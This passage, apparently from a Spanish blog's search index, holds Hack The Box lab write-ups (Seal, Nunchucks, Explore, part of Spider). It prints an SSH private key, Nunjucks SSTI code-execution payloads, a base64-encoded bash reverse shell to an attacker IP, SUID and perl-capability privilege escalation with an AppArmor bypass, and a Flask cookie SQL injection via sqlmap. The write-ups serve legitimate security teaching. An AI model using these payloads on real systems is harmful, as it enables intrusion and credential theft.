JrYu404k0kID6/06E3b0LcNdvmGn1bRJAf/IqRJwCKA/weiTjneKT0zYF/ETD1h/d5kra6 m5ZzDlibaPWKS8YTON7/SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D/oZ8OXpWnbi5rXU0jD0 wlpKSPYVxzVPZ43A/k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+ VbBB1xPzR4DvM4w9qN3JwDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxK MtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsaw MRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv/cgiTY0xwbmOX AMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe/UQLlT/v/khlnngHHLwutn06n bupeAfHqGzZYJi13FEu8/2kY6TxlH/2WX7WMMsE4KMkjy/nrUixTNzS+0QjKUdvCGS1P6L hFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2ru p0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ/RfGJ+CshtqBeEioaLfPi9CxZ6LN4S 1zriasJdAzB3Hbu4NVVOc/xkH9mTJQ3kf5RGScCYablLjUCOq05aPVqhaW6tyDaf8ob85q /s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAA wQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2 ib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaa WS/o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5 NkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo/zDzVsI4AAADBAOUwZjaZm6w/EGP6 KX6w28Y/sa/0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5O plVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbM kCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx 5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7b Vd3EJug4Wsl/n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lc YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE= -----END OPENSSH PRIVATE KEY----- Y ahora tenemos acceso como luis usando SSH y podemos ver la flag user.txt:\n$ ssh -i id_rsa luis@10.10.10.250 luis@seal:~$ cat user.txt cd731341c30363c7787b8dc5132a8cbe Escalada de privilegios con sudo Este usuario puede ejecutar ansible-playbook como usuario root utilizando sudo:\nluis@seal:~$ sudo -l Matching Defaults entries for luis on seal:  env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User luis may run the following commands on seal:  (ALL) NOPASSWD: /usr/bin/ansible-playbook * Con Ansible Playbooks es posible ejecutar comandos de sistema (más información here), por lo que simplemente podemos añadir permisos SUID a /bin/bash y máquina comprometida (existe también un GTFOBin).\nPrimero creamos un archivo YAML con las acciones que queremos ejecutar:\n- hosts: localhost  tasks:  - command: chmod u+s /bin/bash  Después, podemos ejecutar ansible-playbook con ese archivo YAML para cambiarle los permisos a /bin/bash:\nluis@seal:~$ cd /tmp luis@seal:/tmp$ vim file.yaml luis@seal:/tmp$ cat file.yaml - hosts: localhost  tasks:  - command: chmod u+s /bin/bash luis@seal:~$ sudo /usr/bin/ansible-playbook file.yaml [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match \u0026#39;all\u0026#39; PLAY [localhost] ********************************************************************************************************************************************* TASK [Gathering Facts] *************************************************************************************************************************************** ok: [localhost] TASK [command] *********************************************************************************************************************************************** [WARNING]: Consider using the file module with mode rather than running \u0026#39;chmod\u0026#39;. If you need to use command because file is insufficient you can add \u0026#39;warn: false\u0026#39; to this command task or set \u0026#39;command_warnings=False\u0026#39; in ansible.cfg to get rid of this message. changed: [localhost] PLAY RECAP *************************************************************************************************************************************************** localhost : ok=2 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 luis@seal:/tmp$ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash Y finalmente, podemos entrar como root y leer la flag root.txt:\nluis@seal:/tmp$ bash -p bash-5.0# cat /root/root.txt 9fbff7ee6bedac04af30edca3ad223e6 ","image":"/images/HTB/Seal/Seal.png","permalink":"https://7rocky.github.io/htb/seal/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina contiene una página web de Tomcat montada sobre nginx, lo cual es una configuración vulnerable que desemboca en ejecución remota de comandos (RCE), y también tiene malas configuraciones de permisos en archivos y comandos con sudo. Para comprometer esta máquina se necesitan conocimientos sobre explotación de Tomcat y el sistema de archivos de Linux","time":7,"title":"Seal"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.122   Fecha: 02 / 11 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.122 -p 22,80,443 Nmap scan report for 10.10.11.122 Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA) | 256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA) |_ 256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://nunchucks.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) | tls-nextprotoneg: |_ http/1.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Nunchucks - Landing Page | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK | Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb | Not valid before: 2021-08-30T15:42:24 |_Not valid after: 2031-08-28T15:42:24 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 18.56 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).\nEnumeración web En primer lugar, empezamos mirando el puerto 80. Si introducimos la dirección IP directamente en el navegador, el servidor redirigirá la petición a https://nunchucks.htb, por lo que es necesario introducir el dominio nunchucks.htb en el archivo /etc/hosts. Una vez hecho, podemos ver la página web:\nPodemos tratar de registrar una nueva cuenta, pero parece que la función está deshabilitada:\nY lo mismo para la página de inicio de sesión:\nEntonces, parece que no hay nada vulnerable a primera vista. Tampoco se encuentran rutas interesantes haciendo fuzzing.\nBuscando subdominios Veamos si existen otros subdominios, ya que el servidor parece que está utilizando virtual hosts. Para ello, se puede utilizar gobuster:\n$ gobuster vhost -w $WORDLISTS/dirb/common.txt -u https://nunchucks.htb -k -q Found: store.nunchucks.htb (Status: 200) [Size: 4029]  Y tenemos un subdominio válido. Después de ponerlo en /etc/hosts, podemos entrar en la siguiente página:\nDe nuevo, no se encuentran rutas útiles haciendo fuzzing. Lo único con lo que podemos interactuar es con el campo del correo electrónico:\nEl servidor muestra la tecnología utilizada en las cabederas de respuesta HTTP:\n$ curl -Ik https://store.nunchucks.htb HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Content-Type: text/html; charset=utf-8 Content-Length: 4029 Connection: keep-alive X-Powered-By: Express set-cookie: _csrf=A-Vn2_f9HxsB2GJ2Fii2pQkA; Path=/ ETag: W/\"fbd-udK+KYlYFVN2Nn2DXdm1EXd8mv0\"  Como se puede observar, el servidor está corriendo Express JS, que es un módulo de Node.js. Seguramente exista alguna vulnerabilidad asociada con esta tecnología.\nExplotando un SSTI Pensando en el nombre de la máquina (Nunchucks), existe un motor de plantillas para Node.js llamado Nunjucks. Es probable entonces que el campo del correo electrónico sea vulnerable a Server-Side Template Injection (SSTI).\nPara verificarlo, el payload más común es\n{{7*7}}  Y ver si responde con 49. Utilizando la petición POST desde curl, se puede ver que el payload funciona:\n$ curl https://store.nunchucks.htb/api/submit -d '{\"email\":\"{{7*7}}\"}' -kH 'Content-Type: application/json' {\"response\":\"You will receive updates on the following email address: 49.\"}  Ahora que sabemos que es vulnerable, podemos buscar payloads maliciosos para conseguir ejecución remota de comandos (RCE). El siguiente payload puede encontrarse aquí:\n{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"whoami\")')()}}  Para utilizar este payload en curl, es necesario utilizar un tercer tipo de comillas porque el payload irá encapsulado en un documento JSON. Una solución es utilizar backticks (`), que están soportadas por JavaScript, aunque hay que escaparlas porque curl se ejecuta en un entorno de consola (otra solución podría haber sido escapar o escapar dos beces las comillas normales).\n$ curl https://store.nunchucks.htb/api/submit -d \"{\\\"email\\\":\\\"{{range.constructor('return global.process.mainModule.require(\\`child_process\\`).execSync(\\`whoami\\`)')()}}\\\"}\" -kH 'Content-Type: application/json' {\"response\":\"You will receive updates on the following email address: david\\n.\"}  Y ahora que tenemos RCE, podemos obtener una reverse shell como usuario david.\nAcceso a la máquina Para que el payload de la conexión reversa funcione, podemos codificar el comando de Bash en Base64 para prevenir problemas:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\")')()}}  Ahora, enviamos el payload de SSTI (de nuevo, usando backticks):\n$ curl https://store.nunchucks.htb/api/submit -d \"{\\\"email\\\":\\\"{{range.constructor('return global.process.mainModule.require(\\`child_process\\`).execSync(\\`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\\`)')()}}\\\"}\" -kH 'Content-Type: application/json'  Y obtenemos acceso a la máquina como usuario david desde nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.122. Ncat: Connection from 10.10.11.122:44534. bash: cannot set terminal process group (997): Inappropriate ioctl for device bash: no job control in this shell david@nunchucks:/var/www/store.nunchucks$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null david@nunchucks:/var/www/store.nunchucks$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm david@nunchucks:/var/www/store.nunchucks$ export TERM=xterm david@nunchucks:/var/www/store.nunchucks$ export SHELL=bash david@nunchucks:/var/www/store.nunchucks$ stty rows 50 columns 158  En este punto, ya podemos coger la flag user.txt:\ndavid@nunchucks:/var/www/store.nunchucks$ cd david@nunchucks:~$ cat user.txt 3c5e34ff445df891a0ee282c3d98c6bb  Encontrando capabilities Después de enumerar el sistema de manera usual, encontramos que perl tiene la capability cap_setuid habilitada:\ndavid@nunchucks:~$ getcap -r / 2/dev/null /usr/bin/perl = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  Para escalar privilegios, podemos buscar en GTFOBins para perl o usar mi herramienta gtfobins-cli:\n$ gtfobins-cli --capabilities perl perl ==\u0026gt; https://gtfobins.github.io/gtfobins/perl/ Capabilities If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. cp $(which perl) . sudo setcap cap_setuid+ep perl ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'  No obstante, al ejecutar el comando parece que no funciona:\ndavid@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";' david@nunchucks:~$ whoami david david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"whoami\";' root david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"cat /etc/shadow\";' cat: /etc/shadow: Permission denied david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"cat /root/root.txt\";' cat: /root/root.txt: Permission denied  Solución de problemas Después de investigar un poco, descubrimos que hay unas reglas de AppArmor que solo permiten ejecutar algunos comandos de perl (entre ellos whoami, por eso veíamos que daba root como resultado):\ndavid@nunchucks:~$ ls -a /etc/apparmor.d/ . abstractions force-complain lsb_release sbin.dhclient usr.bin.man usr.sbin.ippusbxd usr.sbin.rsyslogd .. disable local nvidia_modprobe tunables usr.bin.perl usr.sbin.mysqld usr.sbin.tcpdump david@nunchucks:~$ cat /etc/apparmor.d/usr.bin.perl # Last Modified: Tue Aug 31 18:25:30 2021 #include \u0026lt;tunables/global\u0026gt; /usr/bin/perl { #include \u0026lt;abstractions/base\u0026gt; #include \u0026lt;abstractions/nameservice\u0026gt; #include \u0026lt;abstractions/perl\u0026gt; capability setuid, deny owner /etc/nsswitch.conf r, deny /root/* rwx, deny /etc/shadow rwx, /usr/bin/id mrix, /usr/bin/ls mrix, /usr/bin/cat mrix, /usr/bin/whoami mrix, /opt/backup.pl mrix, owner /home/ r, owner /home/david/ r, }  Existe un bug de AppArmor que permite evitar la protección si el código de perl se ejecuta desde un archivo con \u0026ldquo;shebang\u0026rdquo; (#!/usr/bin/perl).\nEscalada de privilegios Aprovechando el bug, podemos poner el \u0026ldquo;one-liner\u0026rdquo; de perl que no funcionaba en un archivo con \u0026ldquo;shebang\u0026rdquo;:\ndavid@nunchucks:~$ cd /tmp david@nunchucks:/tmp$ echo -e '#!/usr/bin/perl\\n\\nuse POSIX (setuid);\\nPOSIX::setuid(0);\\nexec \"/bin/bash\";'  .priv.pl david@nunchucks:/tmp$ cat .priv.pl  #!/usr/bin/perl usePOSIX (setuid); POSIX::setuid(0); exec\"/bin/bash\";  Ahora, basta con darle permisos de ejecución y acto seguido ejecutarlo. Tras esto, ya somos usuario root y por tanto, podemos ver la flag root.txt:\ndavid@nunchucks:/tmp$ chmod +x .priv.pl david@nunchucks:/tmp$ ./.priv.pl root@nunchucks:/tmp# cat /root/root.txt 1890e79a33c09beb8878bec7a4595c25  ","image":"/images/HTB/Nunchucks/Nunchucks.png","permalink":"https://7rocky.github.io/htb/nunchucks/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a Server-Side Template Injection (SSTI) y tiene algunas capabilities habilitadas pero protegidas. Para comprometer la máquina se necesitan conocimientos de plantillas en Node.js y ejecución de comandos en Perl","time":5,"title":"Nunchucks"},{"contents":"  SO: Android   Dificultad: Fácil   Dirección IP: 10.10.10.247   Fecha: 26 / 06 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.247 -p 2222,5555,37019,42135,59777 Nmap scan report for 10.10.10.247 Host is up (0.090s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 37019/tcp open unknown ... 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn't have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn't have a title (text/plain). ... Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 104.70 seconds  La máquina tiene abiertos los puertos 2222 (SSH), 37019, 42135 (ES File Explorer) y 59777 (Bukkit JSONAPI httpd for Minecraft). El puerto 5555 está filtrado.\nExplotando ES File Explorer Existe una PoC para el servicio Android ES File Explorer en el puerto 59777, escrito en Python. Con esto, se pueden listar e incluso descargar archivos del propio dispositivo:\n$ python3 poc.py --ip 10.10.10.247 --cmd listPics [*] Executing command: listPics on 10.10.10.247 [*] Server responded with: 200 {\"name\":\"concept.jpg\", \"time\":\"4/21/21 02:38:08 AM\", \"location\":\"/storage/emulated/0/DCIM/concept.jpg\", \"size\":\"135.33 KB (138,573 Bytes)\", }, {\"name\":\"anc.png\", \"time\":\"4/21/21 02:37:50 AM\", \"location\":\"/storage/emulated/0/DCIM/anc.png\", \"size\":\"6.24 KB (6,392 Bytes)\", }, {\"name\":\"creds.jpg\", \"time\":\"4/21/21 02:38:18 AM\", \"location\":\"/storage/emulated/0/DCIM/creds.jpg\", \"size\":\"1.14 MB (1,200,401 Bytes)\", }, {\"name\":\"224_anc.png\", \"time\":\"4/21/21 02:37:21 AM\", \"location\":\"/storage/emulated/0/DCIM/224_anc.png\", \"size\":\"124.88 KB (127,876 Bytes)\"}  Vemos que hay cuatro imágenes en el móvil. La más interesante es la que se llama creds.jpg:\n$ python3 poc.py --ip 10.10.10.247 --get-file /storage/emulated/0/DCIM/creds.jpg [*] Getting file: /storage/emulated/0/DCIM/creds.jpg from: 10.10.10.247 [*] Server responded with: 200 [*] Writing to file: creds.jpg  Esta imagen creds.jpg las credenciales de acceso al móvil por SSH en el puerto 2222 (kristi:Kr1sT!5h@Rp3xPl0r3!):\nConexión al dispositivo por SSH $ ssh kristi@10.10.10.247 -p 2222 Password authentication Password: :/ $  La flag user.txt se encuentra en /sdcard:\n:/ $ ls -la /sdcard/ total 52 drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Alarms drwxrwx--- 3 root everybody 4096 2021-03-13 17:16 Android drwxrwx--- 2 root everybody 4096 2021-04-21 02:38 DCIM drwxrwx--- 2 root everybody 4096 2021-03-13 17:37 Download drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Movies drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Music drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Notifications drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Pictures drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Podcasts drwxrwx--- 2 root everybody 4096 2021-03-13 17:16 Ringtones drwxrwx--- 3 root everybody 4096 2021-03-13 17:30 backups drwxrwx--- 2 root everybody 4096 2021-04-21 02:12 dianxinos -rw-rw---- 1 root everybody 33 2021-03-13 18:28 user.txt :/ $ cat /sdcard/user.txt f32017174c7c7e8f50c6da52891ae250  \u0026ldquo;Rooteando\u0026rdquo; el dispositivo Para \u0026ldquo;rootear\u0026rdquo; el dispositivo, es necesario conectarse utilizando adb y después ejecutar adb root y adb shell. Sin embargo, adb necesita que el puerto 5555 esté abierto en el dispositivo, y este está filtrado, como se vio en la salida de nmap.\nPara evitar esta protección, la conexión se puede realizar con un reenvío de puertos por SSH:\n$ ssh -fNL 5000:localhost:5555 kristi@10.10.10.247 -p 2222  Y ahora, adb puede conectarse al dispositivo a través de localhost:5000 y conseguir la flag root.txt:\n$ adb kill-server $ adb start-server * daemon not running; starting now at tcp:5037 * daemon started successfully $ adb connect 127.0.0.1:5000 connected to 127.0.0.1:5000 $ adb devices List of devices attached 127.0.0.1:5000 device $ adb root $ adb shell x86_64:/ # find / -name root.txt 2\u0026gt;/dev/null /data/root.txt x86_64:/ # cat /data/root.txt f04fc82b6d49b41c9b08982be59338c5  ","image":"/images/HTB/Explore/Explore.png","permalink":"https://7rocky.github.io/htb/explore/","section":"htb","summary":"Hack The Box. Android. Máquina fácil. Se trata de dispositivo móvil Android que contiene una aplicación vulnerable a lectura de archivos del dispositivo, a través de la cual se obtienen credenciales de acceso por SSH para poder escalar privilegios. Para comprometer el dispositivo, se necesitan conceptos de escaneo de puertos, reenvío de puertos y Android","time":2,"title":"Explore"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.10.243   Fecha: 29 / 05 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.243 -p 22,80 Nmap scan report for 10.10.10.243 Host is up (0.034s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA) | 256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA) |_ 256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://spider.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.15 seconds La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nExploración web Si entramos en http://10.10.10.243, el servidor redirige la petición a http://spider.htb. Esto significa que el servidor utiliza virtual hosting, por lo que necesitamos incluir el dominio spider.htb en el archivo /etc/hosts. Y ahora, podemos acceder a la página:\nUtilizando gobuster podemos encontrar algunas rutas del servidor:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://spider.htb /index (Status: 200) [Size: 11273] /login (Status: 200) [Size: 1832] /register (Status: 200) [Size: 2130] /main (Status: 302) [Size: 219] [--\u0026gt; http://spider.htb/login] /user (Status: 302) [Size: 219] [--\u0026gt; http://spider.htb/login] /view (Status: 302) [Size: 219] [--\u0026gt; http://spider.htb/login] /cart (Status: 500) [Size: 290] /logout (Status: 302) [Size: 209] [--\u0026gt; http://spider.htb/] /checkout (Status: 500) [Size: 290] Después de inspeccionar la página, podemos ver que está utilizando Flask (un framework para desarrollo back-end con Python), ya que el estado de la respuesta HTTP está en mayúsculas (por ejemplo: OK, FOUND, NOT FOUND, INTERNAL SERVER ERROR\u0026hellip;), lo cual es común en Flask:\n$ curl -I spider.htb/asdf HTTP/1.1 404 NOT FOUND Server: nginx/1.14.0 (Ubuntu) Date: Sat, 23 Oct 2021 10:24:58 GMT Content-Type: text/html; charset=utf-8 Content-Length: 232 Connection: keep-alive Buscando un SSTI Flask utiliza un motor de plantillas llamado Jinja2, que puede ser vulnerable a Server-Side Template Injection (SSTI) si el servidor está mal configurado.\nExiste una cuenta de Twitter que aparece en la página web de un investigador de Ciberseguridad que escribió un artículo sobre SSTI en Flask con Jinja2. Esto se trata de una pista. De hecho, hay más easter eggs relacionados con este artículo.\nDespués de probar en varios campos de formularios, se descubre que la vulnerabilidad de SSTI está en el campo de usuario al registrar una nueva cuenta. Después de registrarse, al acceder a los datos del perfil, el contenido inyectado se muestra ejecutado. Esto se ilustra en las siguientes imágenes:\nA continuación, podemos escribir un script en Python llamado ssti.py para automatizar el proceso de crear una cuenta con SSTI y acceder al perfil para ver el resultado (explicación detallada aquí).\nPor ejemplo, como prueba de concepto:\n$ python3 ssti.py \u0026#39;{{7*7}}\u0026#39; 49 Obtención de la clave secreta de Flask Es necesario tener en cuenta que el campo de usuario solo admite hasta 10 caracteres, por lo que no hay muchos payloads que sean útiles. Sin embargo, podemos obtener el contenido de la variable config de Flask:\n$ python3 ssti.py \u0026#39;{{config}}\u0026#39; \u0026lt;Config {\u0026#39;ENV\u0026#39;: \u0026#39;production\u0026#39;, \u0026#39;DEBUG\u0026#39;: False, \u0026#39;TESTING\u0026#39;: False, \u0026#39;PROPAGATE_EXCEPTIONS\u0026#39;: None, \u0026#39;PRESERVE_CONTEXT_ON_EXCEPTION\u0026#39;: None, \u0026#39;SECRET_KEY\u0026#39;: \u0026#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\u0026#39;, \u0026#39;PERMANENT_SESSION_LIFETIME\u0026#39;: datetime.timedelta(31), \u0026#39;USE_X_SENDFILE\u0026#39;: False, \u0026#39;SERVER_NAME\u0026#39;: None, \u0026#39;APPLICATION_ROOT\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;SESSION_COOKIE_NAME\u0026#39;: \u0026#39;session\u0026#39;, \u0026#39;SESSION_COOKIE_DOMAIN\u0026#39;: False, \u0026#39;SESSION_COOKIE_PATH\u0026#39;: None, \u0026#39;SESSION_COOKIE_HTTPONLY\u0026#39;: True, \u0026#39;SESSION_COOKIE_SECURE\u0026#39;: False, \u0026#39;SESSION_COOKIE_SAMESITE\u0026#39;: None, \u0026#39;SESSION_REFRESH_EACH_REQUEST\u0026#39;: True, \u0026#39;MAX_CONTENT_LENGTH\u0026#39;: None, \u0026#39;SEND_FILE_MAX_AGE_DEFAULT\u0026#39;: datetime.timedelta(0, 43200), \u0026#39;TRAP_BAD_REQUEST_ERRORS\u0026#39;: None, \u0026#39;TRAP_HTTP_EXCEPTIONS\u0026#39;: False, \u0026#39;EXPLAIN_TEMPLATE_LOADING\u0026#39;: False, \u0026#39;PREFERRED_URL_SCHEME\u0026#39;: \u0026#39;http\u0026#39;, \u0026#39;JSON_AS_ASCII\u0026#39;: True, \u0026#39;JSON_SORT_KEYS\u0026#39;: True, \u0026#39;JSONIFY_PRETTYPRINT_REGULAR\u0026#39;: False, \u0026#39;JSONIFY_MIMETYPE\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;: None, \u0026#39;MAX_COOKIE_SIZE\u0026#39;: 4093, \u0026#39;RATELIMIT_ENABLED\u0026#39;: True, \u0026#39;RATELIMIT_DEFAULTS_PER_METHOD\u0026#39;: False, \u0026#39;RATELIMIT_SWALLOW_ERRORS\u0026#39;: False, \u0026#39;RATELIMIT_HEADERS_ENABLED\u0026#39;: False, \u0026#39;RATELIMIT_STORAGE_URL\u0026#39;: \u0026#39;memory://\u0026#39;, \u0026#39;RATELIMIT_STRATEGY\u0026#39;: \u0026#39;fixed-window\u0026#39;, \u0026#39;RATELIMIT_HEADER_RESET\u0026#39;: \u0026#39;X-RateLimit-Reset\u0026#39;, \u0026#39;RATELIMIT_HEADER_REMAINING\u0026#39;: \u0026#39;X-RateLimit-Remaining\u0026#39;, \u0026#39;RATELIMIT_HEADER_LIMIT\u0026#39;: \u0026#39;X-RateLimit-Limit\u0026#39;, \u0026#39;RATELIMIT_HEADER_RETRY_AFTER\u0026#39;: \u0026#39;Retry-After\u0026#39;, \u0026#39;UPLOAD_FOLDER\u0026#39;: \u0026#39;static/uploads\u0026#39;}\u0026gt; De aquí conseguimos la clave secreta que se utiliza para firmar las cookies de sesión. Entonces, está claro que necesitamos realizar alguna acción con las cookies.\nEncontrando una inyección de código SQL Después de investigar sobre las sesiones de Flask y las cookies que genera, encontramos una manera de inyectar código SQL en el contenido de la cookie utilizando sqlmap y el módulo flask_unsign de Python (puede instalarse con pip). Más información en HackTricks.\n$ sqlmap --url http://spider.htb/ --eval \u0026#34;import flask_unsign; session = flask_unsign.session.sign({\u0026#39;cart_items\u0026#39;: [], \u0026#39;uuid\u0026#39;: session}, secret=\u0026#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942\u0026#39;)\u0026#34; --cookie=\u0026#34;session=*\u0026#34; --random-agent --dump ... +----+--------------------------------------+------------+-----------------+ | id | uuid | name | password | +----+--------------------------------------+------------+-----------------+ | 1 | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv | ch1VW4sHERE7331 | +----+--------------------------------------+------------+-----------------+ Para que funcione el comando de sqlmap es importante decir \u0026ldquo;No\u0026rdquo; cuando pregunte por lo siguiente:\n you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] do you want to URL encode cookie values (implementation specific)? [Y/n]  Explotando un SSTI rebuscado Ahora que tenemos la contraseña del usuario chiv (esta es otra referencia al artículo de SSTI) podemos acceder al panel de administración en http://spider.htb/admin:\nComo usuario chiv, se tiene acceso a un panel de tickets en http://spider.htb/view?check=support y podemos añadir nuevos tickets desde http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal. Esta URL se encuentra en un mensaje:\nPodemos tratar de inyectar SSTI otra vez, pero esta vez hay un WAF que bloquea algunos caracteres. Entre los caracteres bloqueados, tenemos: {{, }}, _, ., ', if, for, filter y 